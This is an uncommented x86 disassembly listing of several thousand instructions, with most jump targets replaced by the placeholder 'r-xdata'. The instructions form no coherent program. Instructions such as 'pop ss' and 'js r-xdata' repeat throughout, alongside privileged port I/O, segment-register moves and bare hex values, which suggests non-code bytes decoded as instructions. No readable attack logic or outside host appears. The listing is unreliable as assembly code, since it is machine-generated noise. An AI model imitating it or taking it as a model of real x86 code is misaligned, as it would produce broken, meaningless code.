xor [ edx - 0x40fa48f9 ] 0x61
scasb [ edi ]
adc eax 0x7c001717
cmp [ edi ] dl
pop ss
add [ edi - 0x1 ] ebp
call 0x78be83c4
js r-xdata
pop eax
xor eax 0x78781717
js r-xdata
cdq
pop ss
insd
sub bh ah
insd
pop ds
xor [ edi ] edx
pop ss
xchg ebp eax
add [ ebp + 0x65 ] ah
pop eax
pop ss
js r-xdata
movsd [ edi ] [ esi ]
mov al 0x8d
das
mov esi 0x3cad2fa5
mov al 0x8d
xchg [ esi - 0x5acf52d1 ] bh
js r-xdata
pop eax
js r-xdata
pop ss
js r-xdata
insd
xor ebp eax
call 0x7cf36fb5
mov al 0x82
js r-xdata
pop ss
js r-xdata
or edx [ edi ]
jne r-xdata
add [ esi ] cl
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sbb edx [ edi ]
pop ss
add esp ebp
pop ss
pop ss
js r-xdata
pop ss
add [ edi ] edi
js r-xdata
movhps [ edi ] xmm2
mov esi 0x17097d01
pop ss
pop ss
mov edi 0x17106b8c
out 0x6c eax
0x1e8e8e0 0x2452
sar [ eax - 0x18171753 ] 0x1
js r-xdata
call 0xffffffff80fef431
in al dx
jmp 0x4347f437
js r-xdata
pushfd
mov fs [ ecx - 0x53 ]
add al 0xb0
add [ ecx + 0x6ad618e ] 0xb0
or [ esi + 0x1731be01 ] 0x17
js r-xdata
cmp [ edi ] dl
inc edx
js r-xdata
cmp al 0xb0
lea eax [ esi + 0x30ad2fbe ]
movsd [ edi ] [ esi ]
das
lodsd [ esi ]
js r-xdata
pop ss
js r-xdata
lodsd [ esi ]
xor al 0x86
mov esi 0x5900a5a5
add [ edi ] edx
pop ss
mov bh 0xb6
add [ ebp + 0x78171703 ] ebp
js r-xdata
lea ebp [ edi ]
js r-xdata
test [ ecx ] eax
js r-xdata
pop ss
or al 0xfc
mov [ 0x1d5400b0 ] eax
pop ss
js r-xdata
js r-xdata
mov esi 0x61bbd858
js r-xdata
js r-xdata
js r-xdata
js r-xdata
imul ebp [ eax + edx * 8 ] 0x1
js r-xdata
js r-xdata
pop ss
pop ss
lodsd [ esi ]
loopne r-xdata
add dl [ edi ]
aas
js r-xdata
mov eax 0x1700a200
pop ss
and [ ebp + 0x1baf7fa ] 0xa4
add edx [ edi ]
pop ss
js r-xdata
popad
movsd [ edi ] [ esi ]
sbb dh [ ecx + 0x618ec682 ]
movsd [ edi ] [ esi ]
sbb al 0xb1
add [ esi ] ecx
0xbe84d5
jb r-xdata
movhps [ edi ] xmm2
js r-xdata
pop ss
xor [ edi ] edx
pop ss
js r-xdata
mov al 0x1
push ss
call 0x78be8249
js r-xdata
mov ebx 0x1b8bf17
adc al 0x17
add [ edx + 0x38 ] al
js r-xdata
insd
cmp al [ ecx ]
mov bl 0x15
pop ss
pop ss
js r-xdata
insb
mov edx 0xe717173e
pop edi
0x17172401 0x7817
pop ss
mov cl 0x0
add [ ebp + ebx + 0x17 ] dl
mov eax 0xe8e48a01
call 0x78be7b70
js r-xdata
js r-xdata
call 0xffffffffadabf6a9
sub [ eax + 0x15b46d65 ] bh
call 0xf390e83
fdivr [ ebx - 0x17fb919f ]
js r-xdata
js r-xdata
pop eax
js r-xdata
js r-xdata
js r-xdata
pop ss
lodsd [ esi ]
sub [ eax - 0x17ff80e9 ] bh
js r-xdata
sbb edx [ edi ]
pop ss
js r-xdata
in eax 0x1b
pop ss
pop ss
pop ss
js r-xdata
pop ss
js r-xdata
mov cl 0xb1
movsd [ edi ] gs : [ esi ]
xor [ ecx - 0x3fe577e ] bh
pop ss
pop ss
mov eax 0x170f2900
pop ss
popad
mov ch 0x30
pop ss
popfd
sbb [ edi + 0x173ce900 ] bh
pop ss
sbb [ esi + ecx * 4 - 0x24c1529f ] 0x28
js r-xdata
pop ss
lds esi [ edi - 0x147afe4d ]
call 0x65477b6c
loopne r-xdata
adc edx ebx
out 0x6d eax
das
pop ds
pop ss
pop ss
arpl [ eax - 0x1801fe20 ] sp
call 0x6a47bee2
pop ss
pop ss
pop ss
jle r-xdata
outsb
popad
js r-xdata
mov bl 0x2b
js r-xdata
mov ebx 0xe8046e61
js r-xdata
js r-xdata
out dx al
call 0x78be849a
mov eax [ 0x78e8e8ee ]
js r-xdata
call 0x28f373aa
mov eax 0x15b46d65
mov eax 0xe8007f17
mov bl 0x8e
popad
mov ch 0x16
add [ ebp - 0x4a9e714d ] 0xe8
add [ esi + 0x618e3263 ] 0xb5
0xb5618eb3 0x82ec
mov ch 0xea
mov bl 0x8e
popad
mov ch 0xec
sbb dh 0xb3
add ecx ecx
daa
pop ss
pop ss
js r-xdata
arpl [ eax - 0x1b579c1c ] bp
arpl ax bp
arpl ax bp
arpl [ eax - 0x33139e10 ] bp
arpl sp bp
int3
insd
sub bh ah
insb
js r-xdata
js r-xdata
js r-xdata
mov fs [ ecx - 0x53 ]
js r-xdata
jecxz r-xdata
mov eax 0xe7286dcc
insb
inc edx
jmp r-xdata
arpl [ ebp - 0x3347e820 ] bp
insd
sub bh ah
call 0x28b3f6ed
add ebp edx
or [ edi ] edx
pop ss
js r-xdata
add al 0xe8
js r-xdata
pop ss
js r-xdata
js r-xdata
insd
sub edi [ eax + 0x78 ]
pop ss
popfd
or [ ecx ] al
cmp eax 0x78781717
js r-xdata
out dx al
pop es
pop ss
pop ss
add [ ecx ] esp
push ds
pop ss
pop ss
js r-xdata
insb
js r-xdata
lea ecx [ edx ]
out 0x6c eax
js r-xdata
jg r-xdata
pop ss
js r-xdata
pop ss
insb
xlat
xor edx [ edi ]
pop ss
add [ edx ] edi
das
pop ss
js r-xdata
sbb edx [ edi ]
sbb edx [ bx ]
lodsd [ gs : esi ]
pop ss
pop ss
js r-xdata
js r-xdata
push esp
mov eax 0xe8f92401
call 0x7c47b71c
add dl [ edi ]
mov cl 0x6d
sub bh ah
insd
or eax 0x65e8e8f9
lodsd [ esi ]
js r-xdata
js r-xdata
call 0x4247f611
or [ edi ] dl
js r-xdata
pop ss
pop ss
or dh 0x8b
cmp [ edi - 0x45 ] 0x61
outsb
add al ch
call 0xf280e94
pop ss
pop ss
add [ esi + 0x78171737 ] edi
mov eax 0xb828ad65
pop ss
jg r-xdata
call 0xfffffffff346f682
push cs
js r-xdata
pop ss
mov eax 0x65e09d17
lodsd [ esi ]
cmp al 0x1
xchg esi eax
add eax 0x3c011717
sub eax 0x6ce71717
xor [ ebp + 0x33 ] ch
out 0x6c eax
dec esp
aaa
pop ss
pop ss
add bh 0xb1
or eax 0x7661bb76
cmp al ch
call 0xf170e65
pop ss
pop ss
sbb [ ecx - 0x4427a742 ] 0x61
out dx al
add ah al
push cs
pop ss
pop ss
add [ ebx - 0x4427a742 ] 0x61
js r-xdata
jo r-xdata
js r-xdata
or ebx [ ebx ]
js r-xdata
jg r-xdata
js r-xdata
pop ss
js r-xdata
lodsd [ gs : esi ]
dec eax
mov eax 0x64002e63
adc [ edi ] dl
pop ss
add al 0xe4
add [ eax + ebx + 0x17 ] ebp
pop ss
js r-xdata
js r-xdata
add [ 0x7817173a ] edi
popfd
pop ss
pop ss
stosd [ edi ]
imul ebp [ edi ] 0xe8e8e86c
add [ esi ] ebx
or [ edi ] edx
pop ss
js r-xdata
mov edx 0x117171b
in al dx
out 0x6c eax
mov dh 0x1b
pop ss
pop ss
imul edx eax 0xe8e8adb8
out 0x6d eax
sub [ esi + 0x171bf701 ] dh
pop ss
pop ss
fistp [ esi ]
shr [ ebx ] cl
out 0x6e eax
and eax 0x1171711
cmp eax 0x7817173a
call 0x14880f12
js r-xdata
jno r-xdata
sub bh ah
insb
retn 0x171e
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0x7871f7d8
js r-xdata
js r-xdata
popad
mov ch 0x14
add [ edi ] edx
pop ss
js r-xdata
insb
in al dx
call 0x17fef7b5
mov esi 0x3f0f01e0
pop ss
pop ss
js r-xdata
stosd [ edi ]
clc
insd
sub bh ah
insd
js r-xdata
js r-xdata
pop ss
add [ edx + 0x14 ] eax
js r-xdata
sub al 0x68
call 0x2c5111a5
pop ss
arpl [ ecx ] bp
and [ ebx ] ebp
js r-xdata
arpl [ eax ] sp
add dh 0x1
test [ edi ] esp
insb
int3
0x117170b 0x273f
pop ss
pop ss
js r-xdata
and [ edx + 0x278501c6 ] al
js r-xdata
js r-xdata
call 0x78be871d
js r-xdata
js r-xdata
js r-xdata
pop ss
adc al 0x1
js r-xdata
add [ ecx + edi * 8 ] esp
js r-xdata
call 0x175a4f2c
js r-xdata
pop ss
insb
js r-xdata
in al dx
fild [ eax + 0x6314b563 ]
jmp r-xdata
adc eax 0x618e1717
js r-xdata
sub edi [ eax + 0x78 ]
pop ss
mov edi 0x1b0b01bf
pop ss
js r-xdata
call 0xffffffffe8c6f867
jmp 0xffffffffcc47f86c
popad
js r-xdata
js r-xdata
jle r-xdata
mov eax 0x170c9d17
mov edi 0xe06601f4
call 0xffffffffe0e373eb
mov eax 0x40a5618e
jg r-xdata
js r-xdata
push edi
add [ edi ] dl
js r-xdata
js r-xdata
pop ss
pop ss
call 0x1ee9181
jl r-xdata
stc
mov fs [ ecx - 0x5b ]
sbb [ eax ] al
dec ebx
out dx al
call 0x65f2910f
insd
mov [ edi ] ss
pop ss
pop ss
mov esi 0xfe7501b8
call 0x78be871e
js r-xdata
adc al 0x17
inc edx
ror [ esi ] 0x1
pop ss
out 0x6c eax
pop ss
lodsd [ esi ]
adc al 0xb9
mov esi 0x15646565
pop ss
mov fs [ ecx - 0x5b ]
inc eax
fadd [ edi ]
popad
mov ch 0x48
mov fs [ ecx - 0x43 ]
dec esp
add [ eax ] dh
push edi
pop ss
pop ss
xchg ebp eax
adc eax 0x618e1717
js r-xdata
pop ss
pop ss
sub al 0x17
jle r-xdata
add [ edx + 0x117170b ] bl
aas
daa
js r-xdata
js r-xdata
js r-xdata
call 0x6e2d88c4
call 0x1fef8cc
and edi [ eax ]
js r-xdata
sub al 0x2f
lodsd [ esi ]
sbb eax 0xe882e882
mov gs [ edi ]
lodsd [ esi ]
adc [ edi ] edx
cmp [ ecx - 0x4b ] ah
test al 0xe0
popad
lodsd [ esi ]
adc al 0x1
cld
pop ss
js r-xdata
mov cl 0x1
mov bh 0x38
pop ss
pop ss
js r-xdata
js r-xdata
fidiv [ eax ]
js r-xdata
pop ss
mov fs [ ecx - 0x6b ]
js r-xdata
insd
pop esp
adc [ edi ] dl
pop ss
add eax edi
xor al 0x17
pop ss
js r-xdata
mov ch 0x1c
mov edi 0x17386600
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
sub [ ecx ] al
pop ss
js r-xdata
add [ ebx ] esp
pop ss
pop ss
js r-xdata
js r-xdata
popad
mov ch 0xa6
js r-xdata
pop ss
call 0x3869119e
imul ebp [ eax + edi * 8 ] 0x6b
xchg esp eax
int3
js r-xdata
js r-xdata
mov fs [ ecx - 0x54 ]
int3
xor al 0xe8
call 0x204cd0d
sbb [ eax ] cl
test al 0x1
mov ecx 0x78e8e8e6
js r-xdata
pop ss
js r-xdata
popad
js r-xdata
pop ss
mov ebx 0xb804ad65
add [ ebx + 0x16 ] esi
pop ss
pop ss
pushfd
int3
jle r-xdata
mov fs [ ecx - 0x4b ]
mov eax 0x36639a82
add [ ecx + 0xf ] edi
xor [ esi + 0x63a4b561 ] cl
xor [ esi + 0x63a6b561 ] ecx
sub bh ah
js r-xdata
arpl [ edi ] si
cmpsb [ esi ] [ edi ]
js r-xdata
clc
imul edx [ esp + ecx * 8 + 0x6de7e9fc ] 0x5c
add edx [ edi ]
arpl [ ebp + 0x30710114 ] bp
pop ss
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
sub [ edi ] dl
pop ss
js r-xdata
popad
lodsd [ esi ]
or [ ecx ] al
or dl [ edi ]
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0x177cdb87
pop ss
insd
sub bh ah
pop ss
pop ss
js r-xdata
insd
fadd [ edi ]
pop ss
pop ss
pop ss
pop ss
js r-xdata
call 0x1e47f9ac
push edi
pop ss
pop ss
js r-xdata
insb
js r-xdata
aaa
js r-xdata
pop ss
js r-xdata
push 0xb8e8e8e8
js r-xdata
cwde
add ebp ebp
or dl [ edi ]
pop ss
mov eax [ 0x1ca5eb10 ]
add [ edi + 0x1717173f ] ecx
jle r-xdata
add [ ecx + 0xc ] al
pop ss
js r-xdata
js r-xdata
out 0x34 eax
pop ss
pop ss
arpl [ ebp + 0x782bb5e0 ] bp
js r-xdata
mov dl 0x1
sbb esp esi
call 0xffffffffe7be8933
mov fs [ ecx - 0x43 ]
js r-xdata
out 0xe8 al
popfd
in al 0x63
lodsd [ esi ]
loopne r-xdata
out 0x6d eax
cwde
adc al 0x63
loopne r-xdata
call 0x1801f9df
jle r-xdata
add [ edi + 0x78171715 ] ecx
js r-xdata
pop ss
pop ss
js r-xdata
popad
mov ch 0xb8
sbb [ edx + 0x79013663 ] 0xf
jmp r-xdata
arpl [ ebx - 0x18d79208 ] bp
js r-xdata
cmp [ edi ] dl
call 0x2347c8cd
js r-xdata
mov eax 0x17bc9e17
js r-xdata
inc esp
call 0xffffffff9617fae8
adc al 0x1
add dl [ edi ]
pop ss
mov esi 0x17250b00
pop ss
mov cl 0x6d
insd
sub [ edi + 0x72bd618e ] 0xb2
jb r-xdata
pop ss
or esp [ 0x6db11717 ]
sbb [ ebp + 0x74bd618e ] 0xb2
mov ebp 0x9d82b272
mov fs [ ecx - 0x43 ]
je r-xdata
js r-xdata
insd
mov eax 0x6b21db8c
adc [ edi ] dl
add esi ebp
pop es
push edi
mov fs [ ecx - 0x43 ]
jbe r-xdata
call 0x17c6f9e6
call 0xffffffffbf01f9eb
add [ edi - 0x15 ] dl
call 0xffffffffe4727cf3
add [ ebx ] edi
sub dl [ edi ]
pop ss
js r-xdata
call 0xffffffffe85d91e7
js r-xdata
fld [ eax ]
add eax ebx
pop es
pop ss
or al 0x17
insb
adc edx [ edi ]
pop ss
mov eax 0x17e0ad63
insd
mov eax 0x17382301
mov fs [ ecx - 0x43 ]
mov ah 0x82
xor [ edx + 0x618e8682 ] 0x82b2b6bd
mov [ esi + 0x188bd61 ] cs
popfd
adc al 0x17
popfd
or al 0x17
mov edi 0xf3601f4
pop ss
pop ss
js r-xdata
sahf
mov esp 0x17e09d17
sub al 0x17
jle r-xdata
mov ebp 0x17267601
js r-xdata
pop ss
pop ss
add [ esi + 0x28 ] ecx
pop ss
pop ss
js r-xdata
sub [ esi + 0x782b21b3 ] dh
js r-xdata
popad
lodsd [ esi ]
inc edx
arpl [ esi ] di
out 0x6c eax
js r-xdata
js r-xdata
call 0x104ccec
push edi
jmp r-xdata
adc [ edi ] 0xe8
pop ss
insd
and [ 0xffffffffde011717 ] dl
xor [ edi ] dl
mov edi 0xdb05ad61
xor esp [ ebp - 0x53 ]
adc al 0xb8
mov ebx 0x4ad65bb
mov eax 0x17167301
pop ss
mov esi 0xe7286da4
js r-xdata
js r-xdata
call 0x2bc6fb4d
call 0xffffffffe8c8fb52
mov esi 0xe8eabf00
call 0xffffffffd22a3edf
xchg ebx eax
aam 0xe7
call 0x17609fa9
js r-xdata
sbb al 0x38
pop ss
pop ss
js r-xdata
popad
mov ebp 0x8c82b2b6
mov fs [ ecx - 0x43 ]
mov [ ecx ] al
adc [ gs : 0x1a011717 ] dl
pop ss
add [ 0x78171714 ] ecx
js r-xdata
pop ss
test al 0x6c
out dx eax
call 0xffffffffe7be8aca
insb
pop esp
js r-xdata
fld [ eax ]
add [ edi + 0x6317170c ] eax
xor [ edx - 0x4a9e7175 ] eax
inc esp
mov bl 0x8e
popad
mov ch 0x46
mov edi 0x170d0901
pop ss
js r-xdata
rcr [ ebx ] cl
out 0x6c eax
mov cl 0x3e
pop ss
pop ss
pop ss
pop edi
popfd
or al 0x17
mov edi 0x68e880f4
call 0x167215dd
pop ss
pushad
pop eax
call 0x4047fc76
out dx al
call 0xffffffffb1be8c7c
insd
sub bh ah
insb
in al dx
call 0x17fefc86
mov esi 0xa8936be0
insb
insd
sub bh ah
js r-xdata
adc al 0x17
pop ss
insd
adc al 0x1
js r-xdata
pop ss
mov [ edx ] ds
js r-xdata
pop ss
js r-xdata
call 0x14fb7506
js r-xdata
js r-xdata
js r-xdata
inc esp
push ds
pop ss
pop ss
add [ eax + 0x20 ] dl
pop ss
pop ss
arpl [ eax ] sp
add esp esi
xor [ edi ] edx
pop ss
sub dl 0x1
std
insd
mov ah 0xfd
dec edi
imul edx [ esi ] 0xffffffc8
out 0x6a eax
add eax 0x1171727
cdq
sti
call 0x12b5f962
sbb [ edi ] dl
pop ss
add [ ebx + 0x2f ] ebp
pop ss
pop ss
mov fs [ ecx - 0x20 ]
sub edi [ eax + 0x78 ]
js r-xdata
and [ ebx ] ebp
js r-xdata
js r-xdata
call 0x2bfdfd5e
js r-xdata
js r-xdata
mov [ 0x65171713 ] eax
scasd [ edi ]
out 0x6c eax
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0x25b1496
pop ss
js r-xdata
js r-xdata
mov [ edi + edx ] esi
js r-xdata
pop ss
js r-xdata
arpl [ ebp - 0x23512ccc ] bp
add [ ecx + 0x1c ] eax
pop ss
popad
mov ch 0x14
js r-xdata
js r-xdata
and eax 0x78171733
js r-xdata
push edi
js r-xdata
sbb [ ebx - 0x17137bff ] 0xe8
js r-xdata
mov ecx [ esi - 0x4cbb4a9f ]
mov fs [ ecx - 0x4b ]
inc esi
pop ss
jle r-xdata
or al 0x17
js r-xdata
call 0x78be402f
js r-xdata
js r-xdata
js r-xdata
pop ss
sar [ eax - 0x14911848 ] cl
call 0xffffffffb5a7fc05
add [ esi + 0x26 ] esi
pop ss
sub dl [ edi ]
pop ss
adc [ gs : 0x1a011717 ] dl
sub bh ah
js r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
insd
adc al 0x63
js r-xdata
out 0x6d eax
lodsd [ esi ]
cmp [ esi - 0x37afe48 ] bh
call 0x78be8b1f
out 0x6c eax
push cs
sub al 0x17
pop ss
and [ gs : 0x6d651717 ] dl
and [ ecx ] eax
cmp ah ch
call 0x63be8b04
cwde
aam 0xeb
sbb [ ecx ] al
xchg ebp eax
or edx [ edi ]
pop ss
js r-xdata
insb
pop ss
mov eax 0x105c6565
pop ss
pop ss
add [ ecx + 0x39 ] al
pop ss
pop ss
mov cl 0x6b
adc cl ch
and [ 0x41001717 ] dl
or al 0x17
call 0xffffffffbda9fa86
loopne r-xdata
mov edx 0x78e8e8eb
js r-xdata
js r-xdata
add edx [ edi ]
pop ss
js r-xdata
in eax dx
sub edi [ eax + 0x78 ]
js r-xdata
jmp 0xffffffffe932da72
pop ss
pop ss
scasd [ edi ]
add [ 0x78e8e8ea ] ebx
js r-xdata
lodsd [ esi ]
xor al 0xd3
scasb [ edi ]
fadd [ ecx ]
inc ecx
sbb al 0x17
call 0xffffffffbb5def24
scasd [ edi ]
pop ss
jle r-xdata
insd
xor [ edi + 0x17 ] edx
pop ss
mov esi 0x170c5000
pop ss
popfd
sbb al 0x17
mov edi 0x321019c
pop ss
pushfd
mov fs [ ecx - 0x6b ]
js r-xdata
js r-xdata
js r-xdata
add [ ebp + 0x78e8e8fc ] eax
js r-xdata
call 0x78be8ac4
js r-xdata
pop ss
js r-xdata
insd
adc al ch
js r-xdata
call 0x78be8e5c
js r-xdata
pop ss
js r-xdata
js r-xdata
shr [ ebx ] cl
out 0x6c eax
and al 0xe0
call 0x120e15f2
pop ss
pop ss
mov dl 0x1
cmpsd [ esi ] [ edi ]
pop ss
pop ss
js r-xdata
pop ss
fld [ eax ]
js r-xdata
0x7878e8e8 0x7878
js r-xdata
pop ss
js r-xdata
call 0x1d47fc2d
call 0xffffffffea63152e
out 0x6a eax
xor dl [ edi ]
pop ss
fld [ eax ]
popad
lodsb [ esi ]
int3
js r-xdata
pop eax
xchg ebp eax
js r-xdata
js r-xdata
pop ss
arpl [ ebp + 0x19610138 ] bp
pop ss
pop ss
js r-xdata
or [ ecx - 0x71617d50 ] 0x61
lodsd [ esi ]
sbb [ eax + 0x5019882 ] dh
loopne r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
mov cl 0x6d
sub bh ah
insb
and dl [ edi + 0x17 ]
pop ss
fld [ eax ]
mov dh 0xb3
adc eax 0xbbb81717
js r-xdata
call 0x357116db
js r-xdata
js r-xdata
mov edi 0x79501e0
js r-xdata
js r-xdata
loopne r-xdata
js r-xdata
pop ss
js r-xdata
pop ss
add ebp ebp
add [ ebp + 0x10 ] esp
pop ss
mov fs [ ecx - 0x4b ]
adc [ ebx + 0x36 ] ah
mov fs [ ecx - 0x4b ]
adc ah [ ebx + 0x30 ]
mov fs [ ecx - 0x4b ]
call 0x16c4156b
add [ ebp + 0x17555a01 ] 0x17
pop ss
js r-xdata
sub [ eax + 0x17020701 ] ch
js r-xdata
insb
loop r-xdata
popfd
loopne r-xdata
lodsd [ esi ]
xchg ebp eax
mov bh 0x1
add [ edx ] ebx
pop ss
pop ss
js r-xdata
cmp al 0x1
push ss
push esi
pop ss
pop ss
imul ebp [ esp ] 0x6d
sub bh ah
insb
push ebp
pop ss
js r-xdata
js r-xdata
sbb [ eax + 0x170aed01 ] 0x17
mov esi 0xe7286da4
insb
add al 0x68
add [ ebx ] ch
js r-xdata
cld
insd
sub al 0x68
call 0x182e9802
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
pop es
xchg ebp eax
js r-xdata
add [ edi + 0x78171755 ] eax
js r-xdata
js r-xdata
pop ss
js r-xdata
add dl [ edi ]
add [ edi ] eax
arpl [ edx ] bp
mov fs [ ecx - 0x53 ]
[ edi + 0x1d ] ebp
pop ss
pop ss
js r-xdata
push 0xe7eaf895
insd
add [ ecx ] ch
pop ss
pop ss
js r-xdata
call 0xffffffffe9303048
call 0x78be8bc4
js r-xdata
js r-xdata
xor eax 0x2c6b1717
and [ ebx ] ebp
js r-xdata
outsb
sub al 0xf0
js r-xdata
js r-xdata
or [ edi ] edx
jg r-xdata
call 0xffffffff832efd80
call 0xffffffffc912b134
push ebp
pop ss
pop ss
js r-xdata
movsd [ edi ] gs : [ esi ]
sub al 0x65
lodsd [ esi ]
dec esp
add [ ecx + ecx + 0x17 ] esi
add [ edi + 0x53d101b0 ] 0x17
pop ss
js r-xdata
sub al 0xe4
add [ edi ] edx
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
pop ss
arpl [ ecx + edi * 4 ] ax
mov ecx 0xe8ef1d01
call 0x3bf6164d
pop ss
clc
0x29006de7 0x1717
mov ebx 0x17349d17
test al 0x1
pop es
js r-xdata
js r-xdata
sbb eax 0x78e8e8ea
js r-xdata
add [ ebp - 0x18 ] edi
call 0xfffffffff8981719
call 0x595188e
pop ss
insd
and [ 0xffffffffbbb81717 ] dl
js r-xdata
js r-xdata
js r-xdata
popad
js r-xdata
js r-xdata
pushfd
int3
js r-xdata
js r-xdata
pop ss
call 0x201fd75
adc [ gs : edi ] dl
pop ss
js r-xdata
cmp edx [ edi ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ edi + 0x3a ] eax
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0x2921fd32
mov dh 0xb3
add [ edx + 0x36 ] esi
sub cl [ esi + 0x1f0ad61 ]
outsd
sbb eax 0x78781717
call 0x78be8c33
or [ eax + 0x17bc9e17 ] bh
lodsd [ gs : esi ]
js r-xdata
sbb al 0xe8
call 0x519396e9
js r-xdata
pop ss
mov ebx 0x17558701
pop ss
lodsb [ esi ]
int3
enter 0xbe17 0x9c
js r-xdata
jmp r-xdata
js r-xdata
add [ esi ] ecx
sbb al 0xe9
call 0xffffffffe1052c4d
pop ss
jg r-xdata
popfd
xor al 0x17
add [ edi ] dl
pop ss
js r-xdata
sbb [ ecx ] al
push cs
pop ss
js r-xdata
js r-xdata
movsd [ edi ] [ esi ]
push esi
js r-xdata
push es
pop ss
pop ss
js r-xdata
or al 0x6
js r-xdata
jmp r-xdata
mov esi 0xccac179c
cld
arpl [ esp + ecx * 8 - 0x13502c04 ] bp
js r-xdata
call 0x78be8ded
js r-xdata
pushfd
int3
sbb [ ecx + ebp * 8 ] 0xe8
call 0x1826d37d
js r-xdata
xor [ edi ] edx
pop ss
js r-xdata
imul ebp [ esp ] 0x1
js r-xdata
pop ss
js r-xdata
call 0x175c3ff7
js r-xdata
rol [ eax - 0x17172718 ] 0x1
push eax
movhps [ edi ] xmm2
js r-xdata
js r-xdata
mov cl 0x82
js r-xdata
js r-xdata
js r-xdata
js r-xdata
popfd
clc
pop ss
popfd
in al 0x17
js r-xdata
add [ edi ] edx
pop ss
js r-xdata
popad
call 0x177b40f4
js r-xdata
jmp 0xffffffffbf5dfd4c
pop ss
pop ss
in al 0x1
arpl [ eax ] bx
insd
and al ch
popad
outsb
js r-xdata
js r-xdata
outsb
pushfd
js r-xdata
sub al 0x63
sbb [ esi + ecx * 4 - 0x4ed55a9f ] 0x82
js r-xdata
cmp al 0x65
lodsd [ esi ]
or al 0x1
pop ss
pop ss
pop ss
js r-xdata
0xbebbe8e8 0xac82
pop ss
sub [ ebx + ebx * 8 + 0x60ad6533 ] 0xbb
mov eax 0x17044301
pop ss
js r-xdata
call 0x2221fe9d
add [ 0x1f171711 ] esp
sub esi [ 0x2c6b1717 ]
js r-xdata
push eax
call 0x2f46ffd6
xor al 0x17
js r-xdata
add dl [ eax + 0x17 ]
out 0x6c eax
push ss
sbb [ edi ] dl
pop ss
add [ ebp + 0x3e ] esp
pop ss
pop ss
arpl [ ebx + 0x61ec82fc ] bp
lodsb [ esi ]
int3
sub dh [ ecx + 0x618e9d82 ]
movsd [ edi ] [ esi ]
popad
js r-xdata
mov fs [ ecx - 0x5b ]
js r-xdata
push edx
popfd
clc
scasb [ edi ]
add [ edi ] esp
aaa
pop ss
pop ss
js r-xdata
and eax 0x1f171711
mov al [ ecx ]
fucom st0
call 0x78be8f25
lodsd [ gs : esi ]
js r-xdata
pop ss
js r-xdata
pop ss
or [ ebx - 0x3b ] 0xb
idiv [ edi + 0xc0ae61 ]
push ecx
xor al 0x17
pop ss
cmp [ ebx - 0x40e51e8a ] 0x61
scasb [ edi ]
int3
call 0x347517d7
pop ss
mov edi 0xec571863
jmp 0x6605ff64
js r-xdata
js r-xdata
js r-xdata
movsd [ edi ] [ esi ]
js r-xdata
pop ss
js r-xdata
pop ss
rcl [ esp + ecx * 8 + 0x500201dc ] 0x1
pop ss
js r-xdata
lodsb [ esi ]
mov eax 0x1725d501
js r-xdata
imul ebp [ eax + esi * 8 ] 0x61
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
js r-xdata
aaa
add ebp eax
and edx [ edi ]
sbb [ ebp + 0x2ca5618e ] 0x63
add ecx ecx
popfd
mov fs [ ecx - 0x5b ]
mov cl 0x82
js r-xdata
xchg esp eax
int3
js r-xdata
add ebp edx
js r-xdata
js r-xdata
mov ebp 0x36f900e4
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
push edi
pop ss
pop ss
js r-xdata
leave
fadd [ ecx ]
and eax 0x78781717
js r-xdata
js r-xdata
add [ ecx - 0x1a ] ebp
call 0x78be91ba
js r-xdata
js r-xdata
pop ss
mov eax 0xe09d17
add cl bh
add [ esi - 0x4ee8e8f9 ] ch
and [ ebx ] ebp
js r-xdata
pop ss
arpl [ ebp + 0x36f900e4 ] di
js r-xdata
pop ss
pop ss
js r-xdata
and [ ecx ] eax
add [ eax ] eax
pop ss
pop ss
mov eax 0x17238701
pop ss
js r-xdata
pop ss
out 0x6c eax
test eax 0x63171734
cmpsb [ esi ] [ edi ]
rol [ ecx ] 0xc8
pop ss
pop ss
imul edx [ eax ] 0xffffffe9
out 0x6c eax
xor edi ebp
call 0xffffffffd15df2aa
call 0x174b65a8
mov ch 0xf8
out 0x6d eax
jne r-xdata
pop ss
js r-xdata
lds esp [ ebx ]
pop ss
mov edi 0xe8ebba01
pop ss
js r-xdata
js r-xdata
insb
std
mov edi 0x17354700
pop ss
mov cl 0xb1
insd
sub [ ecx ] al
mov eax 0xdb17171a
sub [ eax + 0x78782b21 ] ch
call 0x4dc6fee8
push ecx
sub bh ah
insb
mov ah 0x35
pop ss
pop ss
pop ss
sahf
mov esp 0x1732a101
pop ss
js r-xdata
add bl ch
and dl [ edi ]
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
sbb al 0x17
js r-xdata
out 0xe8 al
call 0x78be914b
js r-xdata
fsub [ eax ]
js r-xdata
pop ss
in al 0x0
stc
js r-xdata
pop ss
pop ss
add [ edi + 0x6317172a ] ah
arpl [ ecx ] bp
and [ ebx ] ebp
js r-xdata
js r-xdata
js r-xdata
imul esp [ edi + edx ] 0x17
pop ss
pop ss
insd
and [ 0x1b81717 ] dl
popad
xor esp edi
js r-xdata
pop ss
js r-xdata
pop ss
js r-xdata
add eax 0x78781717
js r-xdata
rol [ 0x78781717 ] 0x1
pop ss
js r-xdata
scasb [ edi ]
pop ss
js r-xdata
pop ss
add [ ecx + 0xd ] ecx
pop ss
pop ss
js r-xdata
mov ebx 0x65bbbbbb
insd
js r-xdata
pop ss
js r-xdata
insb
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
insd
cmp al 0x15
pop ss
pop ss
mov eax 0x3c5561bb
adc eax 0x89011717
push edi
pop ss
pop ss
mov eax 0xb8ef5ee7
add [ eax + 0xc ] edi
pop ss
pop ss
js r-xdata
dec eax
mov ebx 0x6d65bbbb
adc eax 0x17b81717
mov edi 0x7f17bbb8
inc esp
mov ebx 0x486d65bb
js r-xdata
call 0xffffffffe8c903f5
pop ss
jle r-xdata
das
lodsd [ esi ]
pop esp
mov al 0x8d
